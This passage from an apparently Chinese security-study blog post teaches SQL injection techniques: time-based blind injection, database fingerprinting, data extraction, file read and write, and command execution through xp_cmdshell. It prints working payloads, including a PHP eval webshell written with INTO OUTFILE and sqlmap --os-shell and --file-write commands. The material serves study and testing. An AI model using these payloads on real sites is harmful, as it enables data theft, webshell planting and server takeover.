-<p>（2）与其他测试方式不同的是，时间型盲注依赖于时间相关函数或语法，每个数据库的函数并不相同只能进行尝试。<br>在实际使用中，通常有直接调用延时函数（或语法）和调用耗时较高的函数（或语法）两种方式：</p>
-<table>
-<thead>
-<tr>
-<th align="center">直接调用延时函数（或语法）</th>
-<th align="center">调用耗时较高的函数（或语法）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">MySQL和SQLserver提供了可直接调用的延时函数和语法，如MySQL的sleep()函数和SQLserver的waitfor()语法可直接调用</td>
-<td align="center">针对其他数据库或延时函数(语法)不适用时可以尝试调用耗时较高的函数或语法。如：select BENCHMARK(10000000,MD5(‘a’));</td>
-</tr>
-</tbody></table>
-<p>（3）Mysql：SLEEP函数可以实现延迟，在所有数据位置均可以使用:</p>
-<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
-SELECT title,context FROM `news` WHERE newsid= 11 and sleep(10)
-对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
-SELECT score FROM `info` WHERE name=&#39;lilei&#39;and sleep(10) and &#39;1&#39;</code></pre>
-<p>（4）SQLserver：WAITFOR DELAY 语句可以实现，通常需要跟在条件判断语句之后:</p>
-<pre><code>对于数字型SQL注入，通常直接拼接判断语句即可
-SELECT title,context FROM `news` WHERE newsid= 11 waitfor delay &#39;0:0:4&#39;
-对于字符型SQL注入点，通常需要使用单引号或双引号闭合原有的单双引号才能进行拼接
-SELECT score FROM `info` WHERE name=&#39;lilei&#39; waitfor delay &#39;0:0:4’</code></pre>
-<h4 id="时间型盲注的结果判断"><a href="#时间型盲注的结果判断" class="headerlink" title="时间型盲注的结果判断"></a>时间型盲注的结果判断</h4><p>时间型盲注的结果判断主要是根据服务器的响应结果，如果在<strong>加入时间型盲注语句后服务器响应有明显的延时，可以判断SQL注入漏洞存在。</strong>为了排除网络环境影响，可以尝试不同延时量的时间型盲注语句，根据延时的差异进一步进行确认。使用Firefox的firebug插件可以准确的跟踪延时信息。</p>
-<h2 id="SQL注入漏洞的利用"><a href="#SQL注入漏洞的利用" class="headerlink" title="SQL注入漏洞的利用"></a>SQL注入漏洞的利用</h2><h3 id="SQL注入的核心利用目标"><a href="#SQL注入的核心利用目标" class="headerlink" title="SQL注入的核心利用目标"></a>SQL注入的核心利用目标</h3><p>（1）SQL注入的核心利用目标主要包括以下三类：</p>
-<ul>
-<li>操作数据</li>
-</ul>
-<pre><code>•查询数据是SQL注入最常见的一种利用方式，网站数据库中通常存储着大量有价值的数据，通过批量查询数据
-的方式可以获取这些数据，也就是人们常说的“拖库”。
-•数据库中通常还存储着WEB应用的管理后台账号密码，通过获取管理后台账号密码可以更加方便的提取数据、
-进行更多操作或为进一步攻击提供便利，因此网站管理后台账号密码往往是数据查询的第一目标
-•除了查询以外，也可以对数据进行增删改操作，达到更多的非法目的</code></pre>
-<ul>
-<li>读写文件</li>
-</ul>
-<pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句读写文件来进行进一步攻击以获取更多的权限，如读取
-网站配置文件、修改注册表文件、上传木马等。</code></pre>
-<ul>
-<li>执行命令</li>
-</ul>
-<pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句执行操作系统命令来进行进一步攻击获取更多的权限，
-如开放远程连接服务、创建系统用户、配合文件读写功能完成反弹shell等。</code></pre>
-<h3 id="SQL注入利用的基本流程"><a href="#SQL注入利用的基本流程" class="headerlink" title="SQL注入利用的基本流程"></a>SQL注入利用的基本流程</h3><p>（1）注入点分析</p>
-<ul>
-<li>注入点位置</li>
-<li>数字型/字符型</li>
-<li>可利用的注入方式（联合查询、报错注入、盲注等）</li>
-</ul>
-<p>（2）判断数据库类型</p>
-<ul>
-<li>MySQL</li>
-<li>SQLserver</li>
-<li>Oracle</li>
-<li>PostgreSQL</li>
-</ul>
-<p>（3）选择漏洞利用目标</p>
-<ul>
-<li>操作数据</li>
-<li>读写文件</li>
-<li>执行命令</li>
-</ul>
-<p>（4）构造漏洞利用语句</p>
-<ul>
-<li>基础利用语句</li>
-<li>绕过过滤</li>
-</ul>
-<h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><p>（1）基于WEB开发语言（推测）</p>
-<ul>
-<li>Asp、aspx通常与access、sqlserver一起使用</li>
-<li>Php通常与mysql、PostgreSQL一起使用</li>
-<li>Jsp通常与oracle和mysql一起使用</li>
-</ul>
-<p>（2）基于报错信息：数据库报错信息通常会暴露数据库类型，可以帮助我们有效判断数据库类型</p>
-<p>（3）基于数据库特性：某些函数、内置表或语法为某些数据库特有，利用这些特性构造相关语句可以<br>帮助我们判断出数据库类型。</p>
-<h4 id="基于报错信息判断"><a href="#基于报错信息判断" class="headerlink" title="基于报错信息判断"></a>基于报错信息判断</h4><p>（1）MySQL：MySQL server字样</p>
-<p><img src="https://i.loli.net/2021/04/24/ocZSYJDwniUq43T.png" alt="image-20210424092955963"></p>
-<p>（2）Oracle：ORA-XXXX字样</p>
-<p><img src="https://i.loli.net/2021/04/24/XtGoqIR2vQkrgmw.png" alt="image-20210424093056008"></p>
-<p>（3）SQLite</p>
-<p><img src="https://i.loli.net/2021/04/24/mOEqc8KFakntS1u.png" alt="image-20210424093122849"></p>
-<h4 id="基于数据库特性判断"><a href="#基于数据库特性判断" class="headerlink" title="基于数据库特性判断"></a>基于数据库特性判断</h4><p>（1）ACCESS</p>
-<pre><code>and (select count (*) from sysobjects)&gt;0返回异常
-and (select count (*) from msysobjects)&gt;0返回异常</code></pre>
-<p>（2）SQLSERVER</p>
-<pre><code>and (select count (*) from sysobjects)&gt;0 返回正常
-and (select count (*) from msysobjects)&gt;0返回异常</code></pre>
-<p>（3）MySQL</p>
-<pre><code>id=2 and version()&gt;0 返回正常
-id=2 and length(user())&gt;0返回正常
-id=2 CHAR(97, 110, 100, 32, 49, 61, 49)返回正常</code></pre>
-<p>（4）Oracle</p>
-<pre><code>and length (select user from dual)&gt;0 返回正常</code></pre>
-<h2 id="SQL注入利用-操作数据-数据查询"><a href="#SQL注入利用-操作数据-数据查询" class="headerlink" title="SQL注入利用-操作数据-数据查询"></a>SQL注入利用-操作数据-数据查询</h2><p>操作数据是SQL注入漏洞最常见的利用方式，其中利用SQL注入查询敏感数据又是操作数据最常见的利用方法，具体流程如下：</p>
-<p>（1）掌握基础知识</p>
-<ul>
-<li>关键表</li>
-<li>关键内置函数</li>
-<li>其他特性</li>
-<li>编码技巧</li>
-</ul>
-<p>（2）选择提取方式</p>
-<ul>
-<li>联合查询</li>
-<li>报错注入</li>
-<li>布尔盲注</li>
-<li>时间盲注</li>
-</ul>
-<p>（3）构造原始语句</p>
-<ul>
-<li>获取数据库名</li>
-<li>获取关键表</li>
-<li>获取关键字段</li>
-<li>获取目标数据</li>
-</ul>
-<p>（4）绕过防护策略</p>
-<ul>
-<li>大小写</li>
-<li>回车换行</li>
-<li>截断</li>
-<li>特殊字符</li>
-<li>特殊函数</li>
-</ul>
-<h3 id="数据提取方式"><a href="#数据提取方式" class="headerlink" title="数据提取方式"></a>数据提取方式</h3><p>（1）联合查询</p>
-<ul>
-<li>构造联合查询语句，将目标数据直接查询出来并显示在页面上</li>
-<li>目标数据直接在页面显示内容中提取</li>
-</ul>
-<p>（2）报错注入</p>
-<ul>
-<li>构造错误的SQL语句，并将目标数据在报错信息中直接显示</li>
-<li>必须在网站回显原始报错数据的情况下使用</li>
-<li>目标数据在报错信息中提取</li>
-</ul>
-<p>（3）布尔型盲注</p>
-<ul>
-<li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面回显内容不同</li>
-<li>根据页面显示结果推断目标数据内容</li>
-</ul>
-<p>（4）时间盲注</p>
-<ul>
-<li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面响应时间不同</li>
-<li>根据页面响应时间推断目标数据内容</li>
-</ul>
-<h3 id="数据查询语句构造"><a href="#数据查询语句构造" class="headerlink" title="数据查询语句构造"></a>数据查询语句构造</h3><h4 id="构造原始语句"><a href="#构造原始语句" class="headerlink" title="构造原始语句"></a>构造原始语句</h4><p>查询当前数据库–&gt;查询关键表–&gt;查询关键字段–&gt;提取目标数据</p>
-<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有<strong>相同<br>数量的列。</strong>列也必须拥有<strong>相似的数据类型（MySQL为弱类型数据库，可不需要相似数据类型）。</strong>当UNION之前的select语句结果集为空时，查询结果将由UNION后的SELECT语句控制。</p>
-<p><img src="https://i.loli.net/2021/04/25/quXcnafewH7YOUo.png" alt="image-20210425194312073"></p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="https://i.loli.net/2021/04/25/w1aF8Kxtq5CLrdG.png" alt="image-20210425194416463"></p>
-<h4 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h4><p><img src="https://i.loli.net/2021/04/25/9XQNd6ziu2qKYsc.png" alt="image-20210425194549389"></p>
-<h4 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h4><p>（1）时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上<strong>使用IF语句加入延时语句来构造，</strong>由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用。</p>
-<p><img src="https://i.loli.net/2021/04/25/kXfIo6OZPv9malA.png" alt="image-20210425194748742"></p>
-<p>（2）说明：</p>
-<ul>
-<li>通常使用sleep()等专用的延时函数来进行时间盲注，特殊情况下也可以使用某些耗时较高的操作代替这些函数。</li>
-<li>为了提高效率，通常在表达式判断为真时执行延时语句。</li>
-<li>时间盲注语句拼接时无特殊要求，保证语法正确即可。</li>
-</ul>
-<h2 id="SQL注入利用-读写文件"><a href="#SQL注入利用-读写文件" class="headerlink" title="SQL注入利用-读写文件"></a>SQL注入利用-读写文件</h2><p>（1）读写权限判断</p>
-<ul>
-<li>关键函数</li>
-<li>关键值</li>
-</ul>
-<p>（2）绝对路径获取：基于报错信息</p>
-<p>（3）文件读取/写入</p>
-<ul>
-<li>文件读取函数</li>
-<li>文件写入函数</li>
-</ul>
-<h3 id="读写文件基础知识"><a href="#读写文件基础知识" class="headerlink" title="读写文件基础知识"></a>读写文件基础知识</h3><p>（1）Windows下：修改my.ini在[mysqld]内加入secure_file_priv=</p>
-<p>Linux下：修改my.cnf在[mysqld]内加入secure_file_priv=</p>
-<p>（2）然后重启mysql，再查询secure_file_priv</p>
-<pre><code>show variables like &#39;%secure%&#39;;
-//若secure_file_priv值为null，表示限制mysqld不允许导入/导出
-//值为/tmp/，表示限制mysqld的导入/导出只能发生在/tmp/目录下
-//若secure_file_priv值没有具体值时，表示不对mysqld的导入/导出做限制。</code></pre>
-<p>（3）读文件：select load_file(“xxx”)</p>
-<p>写文件：select xxx into outfile、select xxx into dumpfile。outfile可以写入多行，dumpfile只能写入一行。</p>
-<p>利用SQL注入写入一句话木马。需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</p>
-<pre><code class="sql">select &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into outfile &quot;D:\\flag.php&quot;;  -- widows下路径要加双斜杠，第一个斜杠表示转义</code></pre>
-<h2 id="SQL注入利用-执行命令"><a href="#SQL注入利用-执行命令" class="headerlink" title="SQL注入利用-执行命令"></a>SQL注入利用-执行命令</h2><p>（1）当数据库是<strong>SQL SERVER</strong>的时候可以利用xp_cmdshell存储过程执行系统命令。在数据库中需要执行以下语句开启xp_cmdshell存储过程。</p>
-<pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;
-EXEC sp_configure &#39;xp_cmdshell&#39;, 
-1;
-RECONFIGURE;</code></pre>
-<p><img src="https://i.loli.net/2021/04/25/AdeurYM6LOmqEZv.png" alt="image-20210425200005888"></p>
-<p>（2）开启之后使用xp_cmdshell可以执行系统命令，如下图所示使用该存储过程可以添加一个管理员组的用户</p>
-<h2 id="扩展："><a href="#扩展：" class="headerlink" title="扩展："></a>扩展：</h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h2 id="SQL注入写马"><a href="#SQL注入写马" class="headerlink" title="SQL注入写马"></a>SQL注入写马</h2><p><strong>大前提：需要知道网站的绝对路径（phpinfo\报错页面\Apache默认页面\目录遍历漏洞。</strong></p>
-<h3 id="利用SQLMAP写马"><a href="#利用SQLMAP写马" class="headerlink" title="利用SQLMAP写马"></a>利用SQLMAP写马</h3><p>payload：</p>
-<pre><code>sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --file-write &quot;Content&quot; --file-dest &quot;Path&quot;
-sqlmap -u &quot;URL&quot; -c &quot;Cookie&quot; --os--shell</code></pre>
-<h3 id="利用语句写马"><a href="#利用语句写马" class="headerlink" title="利用语句写马"></a>利用语句写马</h3><p>前提：secure_file_priv变量值不为NULL，为网站根目录</p>
-<p>MySQL版本：</p>
-<pre><code>MySQL&lt;5.6.34：secure_file_priv可以使用set global secure_file_priv=&quot;path&quot;修改
-MySQL&gt;5.6.34：secure_file_priv不可以使用set global secure_file_priv=&quot;path&quot;修改，且参数默认值为NULL</code></pre>
-<p>payload：</p>
-<pre><code>id=-1&#39; union select &quot;Contents&quot; into outfile &quot;Paht&quot;
-id=-1&#39; union select &quot;Contents&quot; into dumpfile &quot;Path&quot;
-id=1&#39; into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+
-select * from admin where id=&#39;1&#39; into outfile &#39;path&#39; lines terminated by &#39;contents&#39;
-id=1&#39; limit 1 into outfile &#39;Path&#39; lines terminated by &#39;Contents&#39; --+</code></pre>
-<p>tips：</p>
-<pre><code>outfile可以写入多行数据，并且字段和行终止符都可以作为格式输出。
-dumpfile只能写一行，并且输出中不存在任何格式。</code></pre>
-<h3 id="利用日志写马"><a href="#利用日志写马" class="headerlink" title="利用日志写马"></a>利用日志写马</h3><pre><code>set global general_log=&quot;ON&quot;
-set global general_log_file=&quot;Path&quot;
-union select 查询</code></pre>
-<p>过滤：preg_match正则匹配 </p>
-<pre><code>preg_match(&#39;unon&#39;,$sql)&#123;
-
-&#125;</code></pre>
-<p>编码：宽字节注入</p>
-<p>预编译：mysqli_pdo</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全进阶</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/18/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/">展开全文 >></a>
         </p>
       
 
